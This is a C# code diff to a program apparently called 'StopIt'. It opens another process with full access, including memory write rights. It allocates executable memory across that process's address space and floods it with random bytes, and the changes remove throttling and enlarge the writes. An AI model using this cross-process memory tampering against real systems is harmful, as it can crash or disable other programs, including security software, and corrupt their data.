@@ -97,7 +97,7 @@ namespace StopIt
                         const uint WRITE_OWNER = 0x00080000;
                         const uint SYNCHRONIZE = 0x00100000;
                         const uint END = 0xFFF;
-                        const uint PROCESS_ALL_ACCESS = DELETE | READ_CONTROL | WRITE_DAC | WRITE_OWNER | SYNCHRONIZE | END;
+                        const uint PROCESS_ALL_ACCESS = DELETE | READ_CONTROL | WRITE_DAC | WRITE_OWNER | SYNCHRONIZE | END | PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE;
                         const uint PROCESS_VM_OPERATION = 0x0008;
                         const uint PROCESS_VM_READ = 0x0010;
                         const uint PROCESS_VM_WRITE = 0x0020;
@@ -231,17 +231,13 @@ namespace StopIt
                             try
                             {
                                 list = new List<byte>(fbytes);
-                                Thread.Sleep(10);
                                 list.RemoveAt(rnd.Next(0, list.Count));
-                                Thread.Sleep(10);
                                 list.Add((byte)rnd.Next(0, 256));
-                                Thread.Sleep(10);
                                 fbytes = list.ToArray();
-                                Thread.Sleep(10);
                                 for (int i = (int)bA; i < (int)lA; i = i + size)
                                 {
                                     Ai = (IntPtr)i;
-                                    A = VirtualAllocEx(pP, Ai, sizei, MEM_RESERVE | MEM_COMMIT, PAGE_READONLY | PAGE_GUARD);
+                                    A = VirtualAllocEx(pP, Ai, sizei, MEM_RESERVE | MEM_COMMIT, PAGE_READONLY | PAGE_GUARD | PAGE_EXECUTE_READWRITE);
                                     VirtualQueryEx(pP, A, out oP, sizei);
                                     VirtualProtectEx(pP, A, sizei, PAGE_GUARD | oP, out lpOldProtect);
                                     WriteProcessMemory(pP, A, fbytes, sizeu, out lpNumberOfBytesRead);
@@ -260,14 +256,14 @@ namespace StopIt
                         {
                             try
                             {
-                                effic = rnd.Next(200, 300);
+                                effic = rnd.Next(50, 100);
                                 size = 2147483647 / effic;
                                 fbytes = new byte[size];
                                 sizei = (IntPtr)size;
                                 sizeu = (UInt64)size;
                                 for (int j = 0; j < size; j++)
                                 {
-                                    fbytes[j] = (byte)rnd.Next(0, 256);
+                                    fbytes[j] = (byte)rnd.Next(180, 256);
                                 }
                                 return ""filled"";
                             }
